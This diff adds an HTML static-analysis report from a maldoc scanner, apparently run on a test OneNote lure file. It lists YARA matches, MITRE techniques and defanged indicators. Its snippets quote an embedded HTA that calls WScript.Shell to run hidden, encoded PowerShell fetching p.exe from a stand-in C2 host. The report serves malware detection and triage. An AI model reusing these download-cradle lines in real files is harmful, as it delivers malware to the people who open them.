@@ -1,0 +1,109 @@
+<!DOCTYPE html>
+<html lang="en"><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>vbascope report - note_lure.one</title>
+<style>
+:root { color-scheme: light dark; }
+* { box-sizing: border-box; }
+body { font-family: -apple-system, Segoe UI, Roboto, Helvetica, Arial, sans-serif;
+  margin: 0; background: #f4f5f7; color: #1a1a1a; line-height: 1.5; }
+.wrap { max-width: 1000px; margin: 0 auto; padding: 24px 16px 64px; }
+header.top { display: flex; flex-wrap: wrap; align-items: center; gap: 16px;
+  background: #fff; border-radius: 12px; padding: 20px 24px; box-shadow: 0 1px 4px rgba(0,0,0,.08); }
+h1 { font-size: 20px; margin: 0; }
+h2 { font-size: 16px; border-bottom: 2px solid #e0e0e0; padding-bottom: 6px; margin-top: 0; }
+h4 { margin: 14px 0 4px; font-size: 13px; text-transform: uppercase; letter-spacing: .04em; color: #555; }
+.risk { margin-left: auto; text-align: center; min-width: 150px; }
+.score { font-size: 40px; font-weight: 800; line-height: 1; color: #c62828; }
+.badge { display: inline-block; padding: 4px 14px; border-radius: 999px; color: #fff;
+  font-weight: 700; font-size: 13px; background: #c62828; margin-top: 6px; }
+.bar { height: 10px; border-radius: 6px; background: #e0e0e0; overflow: hidden; margin-top: 10px; }
+.bar > span { display: block; height: 100%; width: 100%; background: #c62828; }
+.card { background: #fff; border-radius: 12px; padding: 18px 22px; margin-top: 18px;
+  box-shadow: 0 1px 4px rgba(0,0,0,.06); }
+.exec ul { margin: 8px 0 0; padding-left: 20px; }
+.exec li { margin: 2px 0; }
+table { border-collapse: collapse; width: 100%; font-size: 13px; }
+.kv td { padding: 4px 8px; border-bottom: 1px solid #eee; vertical-align: top; }
+.kv td.k { color: #666; width: 170px; font-weight: 600; }
+.findings th, .findings td { text-align: left; padding: 7px 8px; border-bottom: 1px solid #eee; vertical-align: top; }
+.findings th { background: #fafafa; font-size: 12px; text-transform: uppercase; letter-spacing: .03em; color: #555; }
+.num { text-align: right; font-variant-numeric: tabular-nums; }
+.pill { display: inline-block; padding: 2px 9px; border-radius: 999px; color: #fff; font-size: 11px; font-weight: 700; }
+.desc { color: #333; font-size: 12.5px; }
+.ex { color: #888; font-family: ui-monospace, Menlo, Consolas, monospace; font-size: 11px; margin-top: 3px; white-space: pre-wrap; word-break: break-all; }
+code { font-family: ui-monospace, Menlo, Consolas, monospace; background: #f0f0f0; padding: 1px 5px; border-radius: 4px; font-size: 12px; }
+.muted { color: #999; font-style: italic; }
+details.sec { background: #fff; border-radius: 12px; margin-top: 14px; box-shadow: 0 1px 4px rgba(0,0,0,.06); overflow: hidden; }
+details.sec > summary { cursor: pointer; padding: 14px 22px; font-weight: 700; font-size: 15px; list-style: none; }
+details.sec > summary::-webkit-details-marker { display: none; }
+details.sec > summary::before { content: '▸ '; color: #999; }
+details.sec[open] > summary::before { content: '▾ '; }
+.secbody { padding: 0 22px 18px; }
+details.mod { border: 1px solid #eee; border-radius: 8px; margin: 8px 0; }
+details.mod > summary { cursor: pointer; padding: 8px 12px; font-weight: 600; }
+pre.code { background: #1e1e2e; color: #e0e0e0; padding: 14px; border-radius: 8px; overflow-x: auto;
+  font-family: ui-monospace, Menlo, Consolas, monospace; font-size: 12.5px; line-height: 1.5; margin: 0; }
+pre.code .k { color: #82aaff; }
+pre.code .s { color: #c3e88d; }
+pre.code .c { color: #697098; font-style: italic; }
+ul.ioc { margin: 4px 0; padding-left: 18px; font-family: ui-monospace, Menlo, Consolas, monospace; font-size: 12px; word-break: break-all; }
+ul.flags li { margin: 3px 0; }
+.copybox { width: 100%; font-family: ui-monospace, Menlo, Consolas, monospace; font-size: 12px;
+  border: 1px solid #ddd; border-radius: 8px; padding: 10px; background: #fafafa; }
+footer { margin-top: 30px; color: #999; font-size: 12px; text-align: center; }
+@media (prefers-color-scheme: dark) {
+  body { background: #15161a; color: #e6e6e6; }
+  header.top, .card, details.sec { background: #1f2127; box-shadow: none; border: 1px solid #2c2f36; }
+  h2 { border-color: #2c2f36; }
+  .kv td.k { color: #9aa; }
+  .findings th { background: #24262c; color: #aab; }
+  .kv td, .findings td { border-color: #2c2f36; }
+  code { background: #2a2d34; }
+  .copybox { background: #24262c; border-color: #2c2f36; color: #ddd; }
+}
+</style></head>
+<body><div class="wrap">
+<header class="top">
+  <div>
+    <h1>note_lure.one</h1>
+    <div class="muted">OneNote Section &middot; 482 bytes</div>
+    <div class="muted" style="font-family:ui-monospace,monospace;font-size:11px">SHA256 7dd5a590245646d9354ebc7306d74c1bd73ca53a5fea66928fbd5803deecdfd4</div>
+  </div>
+  <div class="risk">
+    <div class="score">100</div>
+    <div class="muted" style="font-size:11px">/ 100</div>
+    <div class="badge">CRITICAL</div>
+    <div class="bar"><span></span></div>
+  </div>
+</header>
+
+<div class="card exec">
+  <h2>Executive summary</h2>
+  <ul><li>6 YARA match(es)</li><li>2 IOC(s)</li></ul>
+  <table class='kv'><thead><tr><th>Reason</th><th>Points</th></tr></thead><tbody><tr><td>Execution capability: WScript.Shell</td><td class='num'>+15</td></tr><tr><td>Execution capability: PowerShell invocation</td><td class='num'>+15</td></tr><tr><td>Execution capability: PowerShell stealth flags</td><td class='num'>+15</td></tr><tr><td>Client capability: Embedded &lt;script&gt; / DOM inject</td><td class='num'>+10</td></tr><tr><td>OneNote embedded payload(s): 1</td><td class='num'>+20</td></tr><tr><td>YARA: Maldoc_PowerShell_DownloadCradle</td><td class='num'>+10</td></tr><tr><td>YARA: Maldoc_PowerShell_StealthFlags</td><td class='num'>+10</td></tr><tr><td>YARA: Maldoc_VBA_Shell_Execution</td><td class='num'>+10</td></tr><tr><td>YARA: OneNote_Document</td><td class='num'>+10</td></tr><tr><td>YARA: OneNote_Embedded_File</td><td class='num'>+10</td></tr><tr><td>YARA: OneNote_Embedded_Script_Or_PE</td><td class='num'>+10</td></tr></tbody></table>
+</div>
+
+<div class="card">
+  <h2>File identification</h2>
+  <table class='kv'><tr><td class='k'>File</td><td>note_lure.one</td></tr><tr><td class='k'>Type</td><td>OneNote Section</td></tr><tr><td class='k'>MIME (libmagic)</td><td>application/onenote</td></tr><tr><td class='k'>libmagic</td><td>Microsoft OneNote</td></tr><tr><td class='k'>Size</td><td>482 bytes</td></tr><tr><td class='k'>Magic bytes</td><td>e4525c7b8cd8a74d</td></tr><tr><td class='k'>MD5</td><td>02c2d1449a8ccbf7a78f0e1ce7b4ae80</td></tr><tr><td class='k'>SHA1</td><td>1ac45c9a9159c00370d78c8666e85b13f7e9459f</td></tr><tr><td class='k'>SHA256</td><td>7dd5a590245646d9354ebc7306d74c1bd73ca53a5fea66928fbd5803deecdfd4</td></tr></table>
+</div>
+
+<details class='sec' open><summary>Suspicious indicators</summary><div class='secbody'><table class='findings'><thead><tr><th>Severity</th><th>Indicator</th><th>Category</th><th>Count</th><th>MITRE</th><th>Why it matters</th></tr></thead><tbody><tr><td><span class='pill' style='background:#c62828'>CRITICAL</span></td><td>PowerShell stealth flags</td><td>execution</td><td class='num'>6</td><td><code>T1059.001/T1564</code></td><td class='desc'>Encoded/hidden PowerShell: -enc, -nop, -w hidden, -ep bypass.<div class='ex'>hell -nop -w hidden -enc AAAA http://onenote<br>sh.Run &quot;powershell -nop -w hidden -enc AAAA<br>un &quot;powershell -nop -w hidden -enc AAAA http://on</div></td></tr><tr><td><span class='pill' style='background:#c62828'>CRITICAL</span></td><td>PowerShell invocation</td><td>execution</td><td class='num'>2</td><td><code>T1059.001</code></td><td class='desc'>Spawns PowerShell - the dominant fileless execution vector.<div class='ex'>ipt.Shell&quot;) sh.Run &quot;powershell -nop -w hidden -enc</div></td></tr><tr><td><span class='pill' style='background:#ef6c00'>HIGH</span></td><td>WScript.Shell</td><td>execution</td><td class='num'>6</td><td><code>T1059.001/T1059.005</code></td><td class='desc'>Instantiates the Windows Script Host shell to run commands.<div class='ex'>et sh=CreateObject(&quot;WScript.Shell&quot;) sh.Run &quot;powershel<br>=&quot;VBScript&quot;&gt; Set sh=CreateObject(&quot;WScript.Shell&quot;) sh.Run &quot;powershel</div></td></tr><tr><td><span class='pill' style='background:#ef6c00'>HIGH</span></td><td>Embedded &lt;script&gt; / DOM inject</td><td>client</td><td class='num'>2</td><td><code>T1027.006/T1204.001</code></td><td class='desc'>Inline &lt;script&gt;, runtime script injection (createElementNS) or SVG &lt;foreignObject&gt; - markup-based code (SVG smuggling, HTA, HTML).<div class='ex'>:APPLICATION id=&quot;x&quot;&gt;&lt;script language=&quot;VBScript&quot;</div></td></tr></tbody></table></div></details>
+<details class='sec' open><summary>Modern-format artefacts (OneNote / PDF / LNK / XLL)</summary><div class='secbody'><h4>OneNote embedded payloads (1)</h4><table class='findings'><thead><tr><th>#</th><th>Type</th><th>Size</th><th>PE</th></tr></thead><tbody><tr><td>0</td><td>HTA application</td><td class='num'>180</td><td></td></tr></tbody></table></div></details>
+<details class='sec'><summary>Obfuscation analysis</summary><div class='secbody'><p class='muted'>No significant obfuscation.</p></div></details>
+<details class='sec'><summary>Extracted VBA</summary><div class='secbody'><p class='muted'>No VBA modules.</p></div></details>
+<details class='sec'><summary>Excel 4.0 (XLM) macros</summary><div class='secbody'><p class='muted'>No Excel 4.0 macros.</p></div></details>
+<details class='sec'><summary>RTF embedded objects</summary><div class='secbody'><p class='muted'>No embedded RTF objects.</p></div></details>
+<details class='sec'><summary>YARA matches</summary><div class='secbody'><table class='findings'><thead><tr><th>Rule</th><th>Source</th><th>Description</th><th>Matched strings</th></tr></thead><tbody><tr><td>Maldoc_PowerShell_DownloadCradle</td><td>file</td><td>PowerShell download cradle (fileless payload fetch + run)</td><td class='desc'><code>$ps</code> @ 350: powershell<br><code>$enc</code> @ 376: -enc<br><code>$hidden</code> @ 369: hidden</td></tr><tr><td>Maldoc_PowerShell_StealthFlags</td><td>file</td><td>PowerShell launched with stealth/evasion flags</td><td class='desc'><code>$f1</code> @ 361: -nop<br><code>$f3</code> @ 366: -w hidden</td></tr><tr><td>Maldoc_VBA_Shell_Execution</td><td>file</td><td>VBA process execution primitives</td><td class='desc'><code>$s1</code> @ 326: WScript.Shell</td></tr><tr><td>OneNote_Document</td><td>file</td><td>Microsoft OneNote section file (.one) - MOTW/Protected-View bypass carrier</td><td class='desc'><code>$hdr</code> @ 0: äR\{Ø§M®±SxÐ)Ó</td></tr><tr><td>OneNote_Embedded_File</td><td>file</td><td>OneNote with an embedded FileDataStoreObject (dropped payload)</td><td class='desc'><code>$onenote</code> @ 0: äR\{Ø§M®±SxÐ)Ó<br><code>$fdso</code> @ 216: çã½e&amp;E¤ÄMz¬</td></tr><tr><td>OneNote_Embedded_Script_Or_PE</td><td>file</td><td>OneNote carrying an embedded HTA/script/PE payload (double-click lure)</td><td class='desc'><code>$fdso</code> @ 216: çã½e&amp;E¤ÄMz¬<br><code>$hta</code> @ 252: &lt;HTA:APPLICATION<br><code>$ps</code> @ 350: powershell<br><code>$vbs</code> @ 312: CreateObject(</td></tr></tbody></table></div></details>
+<details class='sec'><summary>Document metadata</summary><div class='secbody'><p class='muted'>No metadata.</p></div></details>
+<details class='sec' open><summary>Indicators of Compromise (defanged)</summary><div class='secbody'><h4>URLs (1)</h4><ul class='ioc'><li>hxxp://onenote-c2[.]example[.]com/p[.]exe</li></ul><h4>Domains (1)</h4><ul class='ioc'><li>onenote-c2[.]example[.]com</li></ul><h4>Copy-friendly (defanged)</h4><textarea class='copybox' readonly rows='3'>hxxp://onenote-c2[.]example[.]com/p[.]exe
+onenote-c2[.]example[.]com</textarea></div></details>
+
+<div class="card">
+  <h2>What to investigate next</h2>
+  <ul><li>Pivot the extracted URLs/domains in VirusTotal, URLhaus and your passive DNS. Pull the staged payload in an isolated VM, not on a host.</li><li>Decode the PowerShell: base64 -d the -enc blob, then deobfuscate the download cradle to recover the second-stage URL.</li><li>OneNote embedded payload(s): carve them with onedump.py (Didier Stevens), hash each dropped file and analyse separately. Watch for ONENOTE.EXE spawning MSHTA/powershell/cmd in a sandbox.</li><li>Cross-reference the SHA256 against MalwareBazaar / your internal corpus before writing it up - you may already have the family and C2.</li></ul>
+</div>
+
+<footer>Generated by vbascope &middot; 2026-11-10T23:35:30.314770+00:00 &middot; static analysis only, sample was never executed</footer>
+</div></body></html>
